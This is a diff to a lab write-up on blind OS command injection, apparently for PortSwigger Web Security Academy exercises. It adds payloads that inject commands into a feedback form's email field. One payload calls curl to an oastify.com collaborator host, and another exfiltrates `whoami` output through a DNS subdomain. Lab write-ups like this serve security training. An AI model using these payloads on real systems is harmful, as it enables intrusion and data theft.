@@ -109,7 +109,11 @@ Success with reading the file using `/image?filename=whoami.out`. How to read th
 > 
 > To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator. 
 
-*Couldn't be done because of the lack of Burp Collaborator and will be done someday in the future.*
+This lab looks like the ones above, injection point however is in the email paramter on the feedback form and can be achieved like this
+
+```
+csrf=ECWUj4AxoEgQQ8bEHffDFlgZ53b9gXuc&name=1&&email=test%40test.de%|`curl+http://b5hgyt5dzs0yckok2u6vgk2kqbw2k08p.oastify.com`&subject=3&message=4
+```
 
 # Blind OS command injection with out-of-band data exfiltration
 
@@ -119,4 +123,12 @@ Success with reading the file using `/image?filename=whoami.out`. How to read th
 > 
 > To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab.
 
-*Couldn't be done because of the lack of Burp Collaborator and will be done someday in the future.*
+In this lab we have to run `whoami` command and exfiltrate it to our server. 
+
+Injection point is the same like in the lab above!
+
+We can run subcommand in subcommand like this:
+
+```
+...email=test%40test.de|$(curl+http://`whoami`.b5hgyt5dzs0yckok2u6vgk2kqbw2k08p.oastify.com)...
+```
